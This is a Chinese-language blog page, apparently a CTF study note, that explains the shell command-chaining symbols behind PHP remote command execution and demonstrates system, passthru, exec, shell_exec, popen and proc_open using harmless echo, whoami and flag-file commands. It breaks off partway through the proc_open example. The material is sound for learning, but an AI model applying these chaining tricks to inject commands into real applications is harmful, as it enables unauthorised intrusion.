@@ -1,0 +1,858 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>RCE | Hexo</title><meta name="author" content="ZLARYY"><meta name="copyright" content="ZLARYY"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="RCERCE(remote command&#x2F;code execute，远程命令执行)漏洞：以PHP为例，system、exec、shell_exec、passthu、popen、proc_popen等函数可以执行系统命令。当我们可以控制这些函数的参数时，就能运行我们想运行的命令，从而进行攻击。 命令拼接符号（Linux） |：管道符，前面命令标准输出，后面命令的标准输入，或者说将前面的命">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RCE">
+<meta property="og:url" content="https://zlaryy123.github.io/2026/02/28/RCE/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="RCERCE(remote command&#x2F;code execute，远程命令执行)漏洞：以PHP为例，system、exec、shell_exec、passthu、popen、proc_popen等函数可以执行系统命令。当我们可以控制这些函数的参数时，就能运行我们想运行的命令，从而进行攻击。 命令拼接符号（Linux） |：管道符，前面命令标准输出，后面命令的标准输入，或者说将前面的命">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://zlaryy123.github.io/img/avertar.png">
+<meta property="article:published_time" content="2026-02-28T07:45:00.000Z">
+<meta property="article:modified_time" content="2026-02-28T07:54:51.376Z">
+<meta property="article:author" content="ZLARYY">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://zlaryy123.github.io/img/avertar.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "RCE",
+  "url": "https://zlaryy123.github.io/2026/02/28/RCE/",
+  "image": "https://zlaryy123.github.io/img/avertar.png",
+  "datePublished": "2026-02-28T07:45:00.000Z",
+  "dateModified": "2026-02-28T07:54:51.376Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "ZLARYY",
+      "url": "https://ZLARYY123.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://zlaryy123.github.io/2026/02/28/RCE/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'RCE',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="referrer" content="no-referrer-when-downgrade"><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Hexo</span></a><a class="nav-page-title" href="/"><span class="site-name">RCE</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">RCE</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-02-28T07:45:00.000Z" title="Created 2026-02-28 15:45:00">2026-02-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-02-28T07:54:51.376Z" title="Updated 2026-02-28 15:54:51">2026-02-28</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>RCE(remote command&#x2F;code execute，远程命令执行)漏洞：以PHP为例，system、exec、shell_exec、passthu、popen、proc_popen等函数可以执行系统命令。当我们可以控制这些函数的参数时，就能运行我们想运行的命令，从而进行攻击。</p>
+<h1 id="命令拼接符号（Linux）"><a href="#命令拼接符号（Linux）" class="headerlink" title="命令拼接符号（Linux）"></a>命令拼接符号（Linux）</h1><ul>
+<li><p><code>|</code>：管道符，前面命令标准输出，后面命令的标准输入，或者说将前面的命令的输出内容作为后一个命令的标准输入，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;JGZsYWc9WkxBUllZezJMNDd5WX0=&quot;|base64 -d</span><br><span class="line">输出内容：</span><br><span class="line">$flag=ZLARYY&#123;2L47yY&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当然，就算后面的命令不需要输入内容也可以执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;You are &quot;|whoami</span><br><span class="line">输出内容：</span><br><span class="line">ZLARYY  //whoami命令执行的结果，可以看到不会输出前面的命令执行的内容</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>&amp;</code>：将前面的命令放在后台执行，不等前面的命令执行结束就开始执行后面的命令，还有一种用法是在一行命令末尾加上<code>&amp;</code>符号使其放在后台运行，比如下载文件……：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;flag=ZLARYY&quot;&amp;echo &quot;&#123;2L47yY&#125;&quot;</span><br><span class="line">输出内容:</span><br><span class="line">[1] 2354  //[1]表示任务编号，是当前终端回话中开启的第一个后台任务，可以通过jobs命令查看，2354为进程ID(PID,Process ID)，可以通过kill 2354来强制停止这个任务</span><br><span class="line">&#123;2L47yY&#125;  //这个是后面的前台命令执行的结果</span><br><span class="line"></span><br><span class="line">flag=ZLARYY  //前面的后台命令执行的结果</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>||</code>：逻辑或，只有前面的命令执行失败才会执行后面的命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;ZLARYY&quot;||echo &quot;can I be exeuted?&quot;</span><br><span class="line">输出内容：</span><br><span class="line">ZLARYY</span><br><span class="line"></span><br><span class="line">cat /flag.txt || echo &quot;找不到 flag 文件！&quot;</span><br><span class="line">输出内容：</span><br><span class="line">cat: /flag.txt: No such file or directory</span><br><span class="line">找不到 flag 文件！</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>&amp;&amp;</code>：逻辑与，只有前面的命令执行成功才会执行后面的命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;ZLARYY&quot;&amp;&amp;echo &quot;sure I can be exeuted!&quot;</span><br><span class="line">输出内容：</span><br><span class="line">ZLARYY</span><br><span class="line">sure I can be exeuted!</span><br><span class="line"></span><br><span class="line">cat /flag.txt&amp;&amp;echo &quot;can I be executed?&quot;</span><br><span class="line">输出内容：</span><br><span class="line">cat: /flag.txt: No such file or directory</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>;</code>：顺序执行，不论前面的命令执行是否成功，都会先执行前面的命令再执行后面的命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;ZLARYY&quot;;echo &quot;&#123;2L47yY&#125;&quot;</span><br><span class="line">输出内容：</span><br><span class="line">ZLARYY</span><br><span class="line">&#123;2L47yY&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>$()和` </code>：把括号或反引号里面的命令先执行，然后把它的输出结果当作字符串拼接到外层命令中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;You are $(whoami)&quot;</span><br><span class="line">输出内容：</span><br><span class="line">You are ZLARYY //将$()替换为``输出结果相同</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>()</code>：子shell运行，在一个全新且独立的子环境中执行，不会影响当前环境的变量或目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(cd /tmp;ls)</span><br><span class="line">//输出内容是ls /tmp的内容，但不会改变当前环境所在目录</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>&#123;&#125;</code>：和()类似，把命令组合起来但是是在当前环境中执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123; cd /tmp;ls; &#125;</span><br><span class="line">//输出内容为ls /tmp，并且目录跳转到/tmp</span><br><span class="line">该符号使用必须在大括号内前后加上空格，并且最后一个命令必须加上分号</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h1 id="系统命令连接符（windows）"><a href="#系统命令连接符（windows）" class="headerlink" title="系统命令连接符（windows）"></a>系统命令连接符（windows）</h1><ul>
+<li><code>&amp;</code>：先执行前面的命令，再执行后面的命令：</li>
+</ul>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;ZLA&quot;&amp;echo &quot;RYY&quot;</span><br></pre></td></tr></table></figure>
+
+  <img src="/2026/02/28/RCE/43.png" class="" width="43">
+
+<ul>
+<li><p><code>&amp;&amp;</code>：逻辑与，只有前面的命令执行成功才会执行后面的命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sort flag.txt&amp;&amp;echo &quot;can I be executed?&quot;</span><br><span class="line"></span><br><span class="line">echo &quot;sure I can be executed!&quot;&amp;&amp;echo &quot;can I be executed?&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/44.png" class="" width="44">
+
+<img src="/2026/02/28/RCE/45.png" class="" width="45">
+</li>
+<li><p><code>|</code>：把前一个命令的输出结果当作后一个命令的标准输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir|findstr  &quot;flag.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/48.png" class="" width="48">
+</li>
+<li><p><code>||</code>：逻辑或，只有前面的命令执行失败才会执行后面的命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sort flag.txt||echo &quot;can I be executed?&quot;</span><br><span class="line"></span><br><span class="line">echo &quot;sure I can be executed!&quot;||echo &quot;can I be executed?&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/46.png" class="" width="46">
+
+<img src="/2026/02/28/RCE/47.png" class="" width="47"></li>
+</ul>
+<h1 id="系统命令执行函数"><a href="#系统命令执行函数" class="headerlink" title="系统命令执行函数"></a>系统命令执行函数</h1><h2 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h2><p>其作用是把当前正在运行的程序暂停后让底层操作系统（windows的CMD或Linux的Bash）执行一条系统命令之后返回结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(string $command, int &amp;$result_code = null): string|false</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><strong>$command</strong>：要执行的系统命令</p>
+</li>
+<li><p><strong>$result_code</strong>：可选参数，存储命令执行后的返回状态码</p>
+</li>
+<li><p><strong>返回值</strong>：成功返回输出的最后一行，失败返回false</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;echo ZLARYY&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/1.png" class="" width="1">
+
+<p>这段代码展现了system()的命令执行功能</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;echo ZLARYY&quot;</span>,<span class="variable">$return</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="variable">$return</span>;</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/2.png" class="" width="2">
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>,<span class="variable">$return</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="variable">$return</span>;</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/3.png" class="" width="3">
+
+<p>可以看到，前面的命令执行成功的话返回状态码为0，失败则返回1，并且就算命令执行失败也不影响后续代码执行</p>
+<p>除此之外，system函数可以将命令执行的结果直接返回到界面上：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;sort flag.txt&quot;</span>,<span class="variable">$return</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="variable">$return</span>;</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/4.png" class="" width="4">
+
+<h2 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h2><p>passthru()是php中用于执行外部程序并<strong>直接输出原始结果</strong>的函数，与system()函数差不多</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passthru(string $command, int &amp;$result_code = null): ?false</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>$command：为要执行的系统命令字符串</li>
+<li>$result_code： 可选，用于接收命令的退出状态码</li>
+<li>成功返回null，失败返回 false</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="string">&quot;sort flag.txt&quot;</span>,<span class="variable">$return</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="variable">$return</span>;</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/5.png" class="" width="5">
+
+<p>不过相较于system()函数，passthru()可以把原始的二进制流正确地传给浏览器显示或下载</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: image/png&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="string">&quot;type avertar.png&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>最后你能打开浏览器看到图片文件</p>
+<h2 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h2><p>相较于system()和passthru()，exec()只会将命令输出的最后一行作为函数的返回值，如果想得到完整输出内容 需要给他提供一个数组变量作为第二个参数，将每一行结果存储进去</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;echo ZLARYY&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/6.png" class="" width="6">
+
+<p>由于我们在cmd中执行echo命令最终执行内容其实为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ZLARYY</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>最后一行为空</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;echo ZLARYY&quot;</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">exec</span>(<span class="string">&quot;echo ZLARYY&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/7.png" class="" width="7">
+
+<p>可以用var_dump或者print_r打印数组</p>
+<h2 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h2><p>该函数可以将命令的完整输出作为字符串返回，但和exec函数一样不会主动返回</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell_exec(string $command): string|false|null</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;type flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/8.png" class="" width="8">
+
+<h2 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h2><p>popen就是pipe open，该函数不会返回命令执行结果，而是返回一个文件指针，但是命令已经执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">popen(string $command, string $mode): resource|false</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>$command</strong>：要执行的系统命令，可包含参数及重定向（如2&gt;&amp;1捕获错误输出）。</li>
+<li><strong>$mode</strong>：”r”表示从进程读取（STDOUT），”w”表示向进程写入（STDIN）。在 Windows 下可用 “rb” &#x2F; “wb” 避免换行符转换。</li>
+<li>返回值是一个类似fopen()的文件指针，但必须用pclose()关闭。</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">popen</span>(<span class="string">&quot;sort flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="variable">$b</span>;</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/9.png" class="" width="9">
+
+<p>可以使用stream_get_contents()函数或者fread()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">popen</span>(<span class="string">&quot;sort flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$a</span>,<span class="number">4096</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="variable">$b</span>;</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/10.png" class="" width="10">
+
+<p>在实际应用popen函数中要记得使用pclose关闭pipe</p>
+<h2 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h2><p>proc_open和popen两个函数的区别在于：popen函数只能建立单向的pipe（要么只能读”r”，要么只能写”w”），如果命令执行报错可能拿不到报错信息，而proc_open不仅能和底层操作系统建立进程联系，还能一次性接通三个pipe：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">标准输入 (Stdin - 0号管)：你可以通过这根管子，源源不断地给程序发送指令或数据。</span><br><span class="line">标准输出 (Stdout - 1号管)：你可以通过这根管子，读取程序正常执行返回的结果。</span><br><span class="line">标准错误 (Stderr - 2号管)：如果程序执行报错了（比如命令打错了、文件不存在），报错信息会专门从这根管子流出来！</span><br></pre></td></tr></table></figure>
+
+<p>相较于其他函数，proc_open明显要麻烦许多：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//定义管道配置图</span></span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>), <span class="comment">//标准输入 (stdin)：给命令喂数据</span></span><br><span class="line">    <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>), <span class="comment">//标准输出 (stdout)：接收命令正常的返回结果</span></span><br><span class="line">    <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>)  <span class="comment">//标准错误 (stderr)：接收命令的报错信息</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//让php连接底层操作系统，并按管道配置图中接好的三根实体pipe放进$pipes这个数组</span></span><br><span class="line"><span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="string">&#x27;sort flag.txt&#x27;</span>,<span class="variable">$descriptorspec</span>,<span class="variable">$pipes</span>);</span><br><span class="line"><span class="comment">//用stream_get_contents()函数读取流中的内容</span></span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="variable">$error</span> =  <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line"><span class="title function_ 